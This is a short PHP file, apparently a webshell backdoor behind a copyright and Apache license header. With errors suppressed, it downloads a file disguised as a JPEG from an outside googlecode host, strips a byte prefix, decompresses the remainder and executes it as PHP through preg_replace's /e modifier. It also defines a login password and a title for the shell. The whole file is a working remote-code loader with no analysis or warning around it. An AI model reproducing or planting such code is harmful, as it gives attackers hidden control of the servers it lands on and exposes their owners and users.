<?php
/**
// +----------------------------------------------------------------------
// | Copyright (c) 2006-2012 ephper All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: ephper <2012heike@gmail.com>
// +----------------------------------------------------------------------
// $Id: [$file] v1 2012-4-19 10:46 ephper $
*/
error_reporting(0);
//define("password",'781f357c35df1fef3138f6d29670365a');
define('password','demo'); 
define('title','山不在高，有仙则名；水不在深，有龙则灵。');
define('copyright', 'E');
$url='http://2012heike.googlecode.com/svn/trunk/make.jpg';
@preg_replace("~(.*)~ies",gzuncompress(substr(call_user_func_array('file_get_contents',array($url,false,stream_context_create(array('http'=>array('method'=>'GET','timeout'=>1))))),3649)),null);
?>